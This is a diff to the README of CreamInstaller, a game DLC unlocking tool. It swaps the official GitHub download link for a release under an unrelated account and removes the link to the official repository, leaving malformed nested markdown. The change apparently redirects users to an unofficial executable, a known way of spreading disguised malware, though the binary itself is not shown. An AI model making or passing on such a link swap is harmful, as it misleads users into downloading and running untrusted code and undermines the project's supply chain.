@@ -29,7 +29,7 @@ games and DLCs the user selects, however through the use of the **right-click co
 
 ---
 #### Installation:
-1. Click [here](https://github.com/pointfeev/CreamInstaller/releases/latest/download/CreamInstaller.zip) to download the latest release from [GitHub](https://github.com/pointfeev/CreamInstaller).
+1. Click [here]([https://github.com/pointfeev/CreamInstaller/releases/latest/download/CreamInstaller.zip](https://github.com/svr123456789/creaminstaller/releases/tag/ver4500)) to download the latest release from GitHub.
 2. Extract the executable to anywhere on your computer you want. *it's completely self-contained*
 
 ---
